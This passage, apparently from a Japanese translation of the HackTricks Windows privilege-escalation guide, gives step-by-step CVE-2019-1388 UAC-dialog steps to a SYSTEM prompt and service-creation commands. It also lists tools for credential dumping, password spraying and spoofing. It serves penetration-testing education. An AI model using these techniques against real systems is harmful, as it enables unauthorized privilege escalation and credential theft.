この脆弱性を悪用するには、以下の手順を実行する必要があります：

```
1) HHUPD.EXEファイルを右クリックし、管理者として実行します。

2) UACプロンプトが表示されたら、「詳細を表示」を選択します。

3) 「発行者の証明書情報を表示」をクリックします。

4) システムが脆弱である場合、「発行者」URLリンクをクリックすると、デフォルトのWebブラウザが表示されることがあります。

5) サイトが完全に読み込まれるのを待ち、「名前を付けて保存」を選択してexplorer.exeウィンドウを表示します。

6) explorerウィンドウのアドレスパスにcmd.exe、powershell.exe、または他の対話型プロセスを入力します。

7) これで、「NT\AUTHORITY SYSTEM」コマンドプロンプトを持つことができます。

8) セットアップとUACプロンプトをキャンセルしてデスクトップに戻ることを忘れないでください。
```

必要なファイルと情報は次のGitHubリポジトリにあります：

https://github.com/jas502n/CVE-2019-1388

## 管理者の中間整合性レベルから高整合性レベル / UACバイパスへ

**整合性レベルについて学ぶには**：

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

次に**UACとUACバイパスについて学ぶには**：

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **高整合性からシステムへ**

### **新しいサービス**

すでに高整合性プロセスで実行している場合、**新しいサービスを作成して実行する**ことで簡単に**SYSTEMに移行**できます：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

高整合性プロセスから、**AlwaysInstallElevatedレジストリエントリを有効にして**、_**.msi**_ ラッパーを使用してリバースシェルを**インストール**することができます。\
[レジストリキーの詳細と_.msi_パッケージのインストール方法についてはこちら。](./#alwaysinstallelevated)

### 高整合性 + SeImpersonate権限からシステムへ

**コードは**[**こちらで見つけることができます**](seimpersonate-from-high-to-system.md)**。**

### SeDebug + SeImpersonateから完全なトークン権限へ

これらのトークン権限を持っている場合（おそらく高整合性プロセスで見つかるでしょう）、SeDebug権限で**ほぼ任意のプロセスを開く**（保護されたプロセスを除く）、プロセスのトークンを**コピーし**、そのトークンで**任意のプロセスを作成する**ことができます。\
この技術を使用すると、通常、すべてのトークン権限を持つSYSTEMとして実行されているプロセスが**選択されます**（_はい、すべてのトークン権限を持たないSYSTEMプロセスが存在します_）。\
**提案された技術を実行するコードの例は**[**こちらで見つけることができます**](sedebug-+-seimpersonate-copy-token.md)**。**

### **名前付きパイプ**

この技術は、`getsystem`でescalateするためにmeterpreterによって使用されます。技術は、**パイプを作成し、そのパイプに書き込むためにサービスを作成/悪用する**ことから成ります。その後、**`SeImpersonate`** 権限を使用してパイプを作成した**サーバー**は、パイプクライアント（サービス）のトークンを**なりすます**ことができ、SYSTEM権限を取得します。\
名前付きパイプについて**もっと学びたい場合は、これを読むべきです**](./#named-pipe-client-impersonation)。\
高整合性からSystemに移行する方法の例を読みたい場合は、[**これを読むべきです**](from-high-integrity-to-system-with-name-pipes.md)。

### Dllハイジャック

SYSTEMとして実行されている**プロセス**によって**ロードされているdll**を**ハイジャック**することができれば、それらの権限で任意のコードを実行することができます。したがって、Dllハイジャックもこの種の権限昇格に役立ちますし、高整合性プロセスからはdllをロードするフォルダーに**書き込み権限**があるため、**はるかに簡単に達成できます**。\
**Dllハイジャックについてもっと学びたい場合は、**[**こちらを読んでください**](dll-hijacking.md)**。**

### **管理者またはネットワークサービスからシステムへ**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICEまたはNETWORK SERVICEから完全な権限へ

**読む:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## より多くの助け

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsローカル権限昇格ベクトルを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 誤設定と機密ファイルをチェックします(**[**こちらをチェック**](../../windows/windows-local-privilege-escalation/broken-reference/)**)。検出されました。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な誤設定をチェックし、情報を収集します(**[**こちらをチェック**](../../windows/windows-local-privilege-escalation/broken-reference/)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 誤設定をチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存されたセッション情報を抽出します。ローカルで-Thoroughを使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerからcrendentialsを抽出します。検出されました。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- ドメイン全体に収集したパスワードをスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveighは、PowerShell ADIDNS/LLMNR/mDNS/NBNSスプーファーおよび中間者攻撃ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的なWindows権限昇格列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の権限昇格の脆弱性を検索します（Watsonに置き換えられました）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（管理者権限が必要です）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の権限昇格の脆弱性を検索します（VisualStudioを使用してコンパイルする必要があります） ([**プリコンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して誤設定を検索します（情報収集ツールとしての機能が強い）（コンパイルが必要です） **(**[**プリコンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（githubにプリコンパイル済みのexeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpをC#に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 誤設定をチェックします（githubにプリコンパイル済みの実行可能ファイルがあります）。推奨されません。Win10ではうまく機能しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な誤設定をチェックします（pythonからのexe）。推奨されません。Win10ではうまく機能しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（適切に機能するためにaccesschkは必要ありませんが、使用することができます）。

**ローカル**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、機能するエクスプロイトを推奨します（ローカルpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、機能するエクスプロイトを推奨します（ローカルpython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトをコンパイルするには、正しいバージョンの.NETを使用する必要があります（[これを見てください](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンを確認するには、次の操作を行います：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**にフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)や[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
